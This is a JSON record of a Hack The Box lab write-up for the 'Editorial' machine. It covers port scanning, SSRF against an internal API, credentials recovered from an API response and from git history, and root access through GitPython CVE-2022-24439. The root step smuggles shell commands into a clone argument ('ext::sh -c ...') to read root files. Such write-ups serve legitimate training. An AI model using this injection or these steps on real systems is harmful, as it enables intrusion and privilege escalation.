@@ -1,0 +1,301 @@
+{
+  "id": "36d3405d-7b65-8019-93f7-ed889b154950",
+  "title": "Editorial",
+  "slug": "editorial",
+  "type": "htb-machine",
+  "platform": "Hack the box",
+  "difficulty": "easy",
+  "tags": [
+    "ssrf",
+    "git"
+  ],
+  "published": true,
+  "featured": true,
+  "date": "2026-05-27",
+  "cover": "https://labs.hackthebox.com/storage/avatars/a466db5ce4f7aaea98f588d1cb71a0aa.png",
+  "summary": "No summary provided for this security writeup.",
+  "blocks": [
+    {
+      "type": "heading_2",
+      "content": "Nmap Scan "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali]\n└─# nmap -sS -sV -sC 10.129.58.176                            \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 05:28 EDT\nNmap scan report for 10.129.58.176\nHost is up (0.29s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)\n|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://editorial.htb\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.09 seconds\n\n",
+      "language": "shell"
+    },
+    {
+      "type": "heading_2",
+      "content": "FFUF Scan "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali]\n└─# ffuf -c -mc 200,301,302,401,403,500  -u http://editorial.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt  \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://editorial.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,301,302,401,403,500\n________________________________________________\n\n                        [Status: 200, Size: 8577, Words: 1774, Lines: 177, Duration: 305ms]\nabout                   [Status: 200, Size: 2939, Words: 492, Lines: 72, Duration: 296ms]\nupload                  [Status: 200, Size: 7140, Words: 1952, Lines: 210, Duration: 287ms]\n:: Progress: [4614/4614] :: Job [1/1] :: 148 req/sec :: Duration: [0:00:34] :: Errors: 0 ::",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "visiting Website editorial.htb"
+    },
+    {
+      "type": "heading_2",
+      "content": "SSRF "
+    },
+    {
+      "type": "paragraph",
+      "content": "We can see its giving some image in /static/images/ directory"
+    },
+    {
+      "type": "paragraph",
+      "content": "lets try checking what ports are active in the server "
+    },
+    {
+      "type": "heading_3",
+      "content": "intruder / scanning for ports"
+    },
+    {
+      "type": "paragraph",
+      "content": "When checking and filtering by length we can see port 5000 is having different response length"
+    },
+    {
+      "type": "paragraph",
+      "content": "Now lets try to get the file "
+    },
+    {
+      "type": "paragraph",
+      "content": "whenever we pass the url and right click the image to open the image , it downloads directly "
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/c84ada75-4cbf-416a-a87b-c7f4bd88808d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UJCQU7QM%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094509Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCiMnH0TfKekJYM%2B6X0DQtj8u356WX%2Fmk2IVnsfC8wjYwIhAPgPo%2FE8SFsbMClpAMZBCUKIF%2FEam2BJRzyKHmaoQt3VKogECLP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwYyHYzcFKLGwl%2BJ6wq3ANMi2gO67Cwe6s7GtSIruo06SCGPL%2FK4kXFHFDxG0Jd0lz07QEajL8sT8Bd7r9y4jhs038e4QSeS3anXjXfCyGTUsyF9tY5DT762U9PlXRXfmwr7JwF4DxGExJyaIUT3UK116EvLhLb82M8SCKTV3Vuj6mUgxD9NUmsKcSRwo58zSvt5vbcCFpvWkQfZzPND0Qv%2BGyDVs1d4upBFEpJ1KcbRRdpX0N2z%2F5NzB8bOshhCC%2BgmVFV6aqIj26Nm4k6XuhFuXUKcsrT2XjM%2F6S153rtX266tWMGOQkT2XschAPb%2B1LVKT5YdxQ8saAIzVytD0RFNXt%2BWTFXjgvzvEeBZoBWoF4BpKH2y0FL2rytXE0UyrqDKg4gdPjsI8kOTGUOWDCVtFJISrTLR3s5XDCRLNdpMzkoujuaxQvjpaE%2F%2B9DP8Fz2LVVdWGplbs1g%2Bp%2Bl43vrKtjaEKFkglZ6sENzZQOKOsRssjvUqImm5F3AEzUUnnsvAhHIz94OoFVvjbIGblQcw7L%2FSD5U9%2FCKlIUsfBW5UmbHxKNq93FPRfqL5k5FKsRfNhyDQgtpEtQzOWE0C4XGirGbzs%2FesCJE4y9RyTM8SrRQKpN6WKh8i5YLQOR16HdByvGLYYgauLo4bDDJlprRBjqkAaaKVGKqq8VKtfZRBYx78I7IhiVrHoTwLVOHK9mwPuURMrGqk1L4DUZZD8cj4VHwfNFmZxNfdGgFv1lMUZsTBB0ufSS3HCgWMO3pweBNzJmq7BbIDMjdKsPw0x1UhUIWR3Do7wPoUYB%2FUa46U64cYSAPSsaCb6t0ukG2uLlNyPNy8%2B8Y5UjEAgz2IKGsc%2FZCQT8NSVeoxA8idHYkoVtRklvEW4wV&X-Amz-Signature=dbe3e15111f434428b443b3d2638719575a8a1e80aeb07f0876ff160dae005bc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "heading_3",
+      "content": "Downloaded File "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/CTF/editorial]\n└─# cat fe0f0d1f-2380-4bfb-aa0e-63ac7a787a59     \n{\"messages\":[{\"promotions\":{\"description\":\"Retrieve a list of all the promotions in our library.\",\"endpoint\":\"/api/latest/metadata/messages/promos\",\"methods\":\"GET\"}},{\"coupons\":{\"description\":\"Retrieve the list of coupons to use in our library.\",\"endpoint\":\"/api/latest/metadata/messages/coupons\",\"methods\":\"GET\"}},{\"new_authors\":{\"description\":\"Retrieve the welcome message sended to our new authors.\",\"endpoint\":\"/api/latest/metadata/messages/authors\",\"methods\":\"GET\"}},{\"platform_use\":{\"description\":\"Retrieve examples of how to use the platform.\",\"endpoint\":\"/api/latest/metadata/messages/how_to_use_platform\",\"methods\":\"GET\"}}],\"version\":[{\"changelog\":{\"description\":\"Retrieve a list of all the versions and updates of the api.\",\"endpoint\":\"/api/latest/metadata/changelog\",\"methods\":\"GET\"}},{\"latest\":{\"description\":\"Retrieve the last version of api.\",\"endpoint\":\"/api/latest/metadata\",\"methods\":\"GET\"}}]}\n   ",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "This  gives the idea that internal port 5000 is being used for api endpoints"
+    },
+    {
+      "type": "paragraph",
+      "content": "the endpoint /api/latest/metadata/messages/authors  gives"
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/1b26a307-2ea4-4d39-99bb-b85b701e2037/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UJCQU7QM%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T094509Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCiMnH0TfKekJYM%2B6X0DQtj8u356WX%2Fmk2IVnsfC8wjYwIhAPgPo%2FE8SFsbMClpAMZBCUKIF%2FEam2BJRzyKHmaoQt3VKogECLP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwYyHYzcFKLGwl%2BJ6wq3ANMi2gO67Cwe6s7GtSIruo06SCGPL%2FK4kXFHFDxG0Jd0lz07QEajL8sT8Bd7r9y4jhs038e4QSeS3anXjXfCyGTUsyF9tY5DT762U9PlXRXfmwr7JwF4DxGExJyaIUT3UK116EvLhLb82M8SCKTV3Vuj6mUgxD9NUmsKcSRwo58zSvt5vbcCFpvWkQfZzPND0Qv%2BGyDVs1d4upBFEpJ1KcbRRdpX0N2z%2F5NzB8bOshhCC%2BgmVFV6aqIj26Nm4k6XuhFuXUKcsrT2XjM%2F6S153rtX266tWMGOQkT2XschAPb%2B1LVKT5YdxQ8saAIzVytD0RFNXt%2BWTFXjgvzvEeBZoBWoF4BpKH2y0FL2rytXE0UyrqDKg4gdPjsI8kOTGUOWDCVtFJISrTLR3s5XDCRLNdpMzkoujuaxQvjpaE%2F%2B9DP8Fz2LVVdWGplbs1g%2Bp%2Bl43vrKtjaEKFkglZ6sENzZQOKOsRssjvUqImm5F3AEzUUnnsvAhHIz94OoFVvjbIGblQcw7L%2FSD5U9%2FCKlIUsfBW5UmbHxKNq93FPRfqL5k5FKsRfNhyDQgtpEtQzOWE0C4XGirGbzs%2FesCJE4y9RyTM8SrRQKpN6WKh8i5YLQOR16HdByvGLYYgauLo4bDDJlprRBjqkAaaKVGKqq8VKtfZRBYx78I7IhiVrHoTwLVOHK9mwPuURMrGqk1L4DUZZD8cj4VHwfNFmZxNfdGgFv1lMUZsTBB0ufSS3HCgWMO3pweBNzJmq7BbIDMjdKsPw0x1UhUIWR3Do7wPoUYB%2FUa46U64cYSAPSsaCb6t0ukG2uLlNyPNy8%2B8Y5UjEAgz2IKGsc%2FZCQT8NSVeoxA8idHYkoVtRklvEW4wV&X-Amz-Signature=2606c5d5a7eb224c6c3c697d057ecce48ff230a8a6a88ad9c5d4a540591495f4&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "paragraph",
+      "content": "this gives the file with the below content"
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/CTF/editorial]\n└─# cat 0f30d281-2562-4215-84b3-7b80788d7461 \n{\"template_mail_message\":\"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: dev080217_devAPI!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, Editorial Tiempo Arriba Team.\"}\n",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "we found the creds for dev user "
+    },
+    {
+      "type": "code",
+      "content": "Username: dev\nPassword: dev080217_devAPI!@",
+      "language": "shell"
+    },
+    {
+      "type": "heading_2",
+      "content": "SSH as Dev "
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/CTF/editorial]\n└─# ssh dev@10.129.58.176                    \ndev@10.129.58.176's password: \nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Wed Jun 19 10:54:18 AM UTC 2024\n\n  System load:           0.02\n  Usage of /:            60.6% of 6.35GB\n  Memory usage:          13%\n  Swap usage:            0%\n  Processes:             228\n  Users logged in:       0\n  IPv4 address for eth0: 10.129.58.176\n  IPv6 address for eth0: dead:beef::250:56ff:fe94:8fa1\n\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nLast login: Wed Jun 19 10:52:56 2024 from 10.10.14.42\ndev@editorial:~$ whoami\ndev",
+      "language": "shell"
+    },
+    {
+      "type": "heading_1",
+      "content": "Priv Esc "
+    },
+    {
+      "type": "heading_2",
+      "content": "Enumeration"
+    },
+    {
+      "type": "paragraph",
+      "content": "in the home directory we can see there is one folder as apps "
+    },
+    {
+      "type": "code",
+      "content": "dev@editorial:~$ ls -lrt\ntotal 8\ndrwxrwxr-x 3 dev  dev 4096 Jun  5 14:36 apps\n-rw-r----- 1 root dev   33 Jun 18 09:54 user.txt",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "content of apps"
+    },
+    {
+      "type": "code",
+      "content": "dev@editorial:~/apps$ ls -la\ntotal 12\ndrwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .\ndrwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..\ndrwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git\ndev@editorial:~/apps$ cd .git\ndev@editorial:~/apps/.git$ ls -lrt\ntotal 48\n-rw-r--r--  1 dev dev   23 Jun  4 11:30 HEAD\n-rw-r--r--  1 dev dev   73 Jun  4 11:30 description\n-rw-r--r--  1 dev dev 6163 Jun  4 11:30 index\n-rw-r--r--  1 dev dev  177 Jun  4 11:30 config\n-rw-r--r--  1 dev dev  253 Jun  4 11:30 COMMIT_EDITMSG\ndrwxr-xr-x  4 dev dev 4096 Jun  5 14:36 refs\ndrwxr-xr-x 70 dev dev 4096 Jun  5 14:36 objects\ndrwxr-xr-x  3 dev dev 4096 Jun  5 14:36 logs\ndrwxr-xr-x  2 dev dev 4096 Jun  5 14:36 info\ndrwxr-xr-x  2 dev dev 4096 Jun  5 14:36 hooks\ndrwxr-xr-x  2 dev dev 4096 Jun  5 14:36 branches\ndev@editorial:~/apps/.git$",
+      "language": "shell"
+    },
+    {
+      "type": "heading_3",
+      "content": "Git Enumeration"
+    },
+    {
+      "type": "paragraph",
+      "content": "since its a git directory lets check the log "
+    },
+    {
+      "type": "code",
+      "content": "dev@editorial:~/apps/.git$ git log\ncommit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)\nAuthor: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>\nDate:   Sun Apr 30 21:04:21 2023 -0500\n\n    fix: bugfix in api port endpoint\n\ncommit dfef9f20e57d730b7d71967582035925d57ad883\nAuthor: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>\nDate:   Sun Apr 30 21:01:11 2023 -0500\n\n    change: remove debug and update api port\n\ncommit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae\nAuthor: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>\nDate:   Sun Apr 30 20:55:08 2023 -0500\n\n    change(api): downgrading prod to dev\n    \n    * To use development environment.\n\ncommit 1e84a036b2f33c59e2390730699a488c65643d28\nAuthor: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>\nDate:   Sun Apr 30 20:51:10 2023 -0500\n\n    feat: create api to editorial info\n    \n    * It (will) contains internal info about the editorial, this enable\n       faster access to information.\n\ncommit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8\nAuthor: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>\nDate:   Sun Apr 30 20:48:43 2023 -0500\n\n    feat: create editorial app\n    \n    * This contains the base of this project.\n    * Also we add a feature to enable to external authors send us their\n       books and validate a future post in our editorial.\n",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "now lets check the commit where prod was downgraded to dev"
+    },
+    {
+      "type": "code",
+      "content": "dev@editorial:~/apps/.git$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae\ncommit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae\nAuthor: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>\nDate:   Sun Apr 30 20:55:08 2023 -0500\n\n    change(api): downgrading prod to dev\n    \n    * To use development environment.\n\ndiff --git a/app_api/app.py b/app_api/app.py\nindex 61b786f..3373b14 100644\n--- a/app_api/app.py\n+++ b/app_api/app.py\n@@ -64,7 +64,7 @@ def index():\n @app.route(api_route + '/authors/message', methods=['GET'])\n def api_mail_new_authors():\n     return jsonify({\n-        'template_mail_message': \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: prod\\nPassword: 080217_Producti0n_2023!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, \" + api_editorial_name + \" Team.\"\n+        'template_mail_message': \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: dev080217_devAPI!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, \" + api_editorial_name + \" Team.\"\n     }) # TODO: replace dev credentials when checks pass\n \n # -------------------------------",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "from here we found the prod creds"
+    },
+    {
+      "type": "code",
+      "content": "Username: prod\nPassword: 080217_Producti0n_2023!@",
+      "language": "shell"
+    },
+    {
+      "type": "heading_2",
+      "content": "Prod user "
+    },
+    {
+      "type": "paragraph",
+      "content": "using the prod cred to ssh"
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/CTF/editorial]\n└─# ssh prod@10.129.58.176\nprod@10.129.58.176's password: \nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Wed Jun 19 11:16:53 AM UTC 2024\n\n  System load:           0.0\n  Usage of /:            60.8% of 6.35GB\n  Memory usage:          13%\n  Swap usage:            0%\n  Processes:             227\n  Users logged in:       0\n  IPv4 address for eth0: 10.129.58.176\n  IPv6 address for eth0: dead:beef::250:56ff:fe94:8fa1\n\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n",
+      "language": "shell"
+    },
+    {
+      "type": "heading_3",
+      "content": "Enum Prod user "
+    },
+    {
+      "type": "paragraph",
+      "content": "lets check what commands prod user can run as root "
+    },
+    {
+      "type": "paragraph",
+      "content": " "
+    },
+    {
+      "type": "code",
+      "content": "prod@editorial:~$ sudo -l \n[sudo] password for prod: \nMatching Defaults entries for prod on editorial:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser prod may run the following commands on editorial:\n    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *\n",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "content of /opt/internal_apps/clone_changes/clone_prod_change.py"
+    },
+    {
+      "type": "code",
+      "content": "prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py\n#!/usr/bin/python3\n\nimport os\nimport sys\nfrom git import Repo\n\nos.chdir('/opt/internal_apps/clone_changes')\n\nurl_to_clone = sys.argv[1]\n\nr = Repo.init('', bare=True)\nr.clone_from(url_to_clone, 'new_changes', multi_options=[\"-c protocol.ext.allow=always\"])",
+      "language": "shell"
+    },
+    {
+      "type": "heading_3",
+      "content": "Vulnerable library"
+    },
+    {
+      "type": "paragraph",
+      "content": "lets check the version of the git library used "
+    },
+    {
+      "type": "code",
+      "content": "prod@editorial:~$ pip3 list | grep -e \"Git\"\nGitPython             3.1.29",
+      "language": "shell"
+    },
+    {
+      "type": "heading_3",
+      "content": "Exploit the vulnerable library"
+    },
+    {
+      "type": "paragraph",
+      "content": "lets look if any vulnerability exist for this version"
+    },
+    {
+      "type": "paragraph",
+      "content": "we found that it has a CVE-2022-24439"
+    },
+    {
+      "type": "paragraph",
+      "content": "the poc "
+    },
+    {
+      "type": "code",
+      "content": "'ext::sh -c touch% /tmp/pwned'",
+      "language": "shell"
+    },
+    {
+      "type": "heading_2",
+      "content": "Root user"
+    },
+    {
+      "type": "paragraph",
+      "content": "lets execute the command again with the above as a argument and as a root user "
+    },
+    {
+      "type": "paragraph",
+      "content": "Note: % is used to escape the space"
+    },
+    {
+      "type": "code",
+      "content": "prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'\n[sudo] password for prod: \nTraceback (most recent call last):\n  File \"/opt/internal_apps/clone_changes/clone_prod_change.py\", line 12, in <module>\n    r.clone_from(url_to_clone, 'new_changes', multi_options=[\"-c protocol.ext.allow=always\"])\n  File \"/usr/local/lib/python3.10/dist-packages/git/repo/base.py\", line 1275, in clone_from\n    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)\n  File \"/usr/local/lib/python3.10/dist-packages/git/repo/base.py\", line 1194, in _clone\n    finalize_process(proc, stderr=stderr)\n  File \"/usr/local/lib/python3.10/dist-packages/git/util.py\", line 419, in finalize_process\n    proc.wait(**kwargs)\n  File \"/usr/local/lib/python3.10/dist-packages/git/cmd.py\", line 559, in wait\n    raise GitCommandError(remove_password_if_present(self.args), status, errstr)\ngit.exc.GitCommandError: Cmd('git') failed due to: exit code(128)\n  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/pwned new_changes\n  stderr: 'Cloning into 'new_changes'...\nfatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "lets check if above worked or not "
+    },
+    {
+      "type": "code",
+      "content": "prod@editorial:~$ ls -la /tmp/pwned \n-rw-r--r-- 1 root root 0 Jun 19 11:50 /tmp/pwned",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "so as we can see it executed and created a file as root"
+    },
+    {
+      "type": "paragraph",
+      "content": "lets try to check the files in root dir"
+    },
+    {
+      "type": "code",
+      "content": "prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c ls% -la% /root% >% /tmp/pwned'\n\nprod@editorial:~$ cat /tmp/pwned \ntotal 36\ndrwx------  5 root root 4096 Jun 18 09:54 .\ndrwxr-xr-x 18 root root 4096 Jun  5 14:54 ..\nlrwxrwxrwx  1 root root    9 Feb  6  2023 .bash_history -> /dev/null\n-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc\ndrwxr-xr-x  3 root root 4096 Jun  5 14:36 .cache\n-rw-r--r--  1 root root   35 Feb  4  2023 .gitconfig\ndrwxr-xr-x  3 root root 4096 Jun  5 14:36 .local\n-rw-r--r--  1 root root  161 Jul  9  2019 .profile\ndrwx------  2 root root 4096 Jun  5 14:36 .ssh\n-rw-r-----  1 root root   33 Jun 18 09:54 root.txt",
+      "language": "shell"
+    },
+    {
+      "type": "paragraph",
+      "content": "lets read the root.txt"
+    },
+    {
+      "type": "code",
+      "content": "prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/pwned'",
+      "language": "shell"
+    }
+  ]
+}
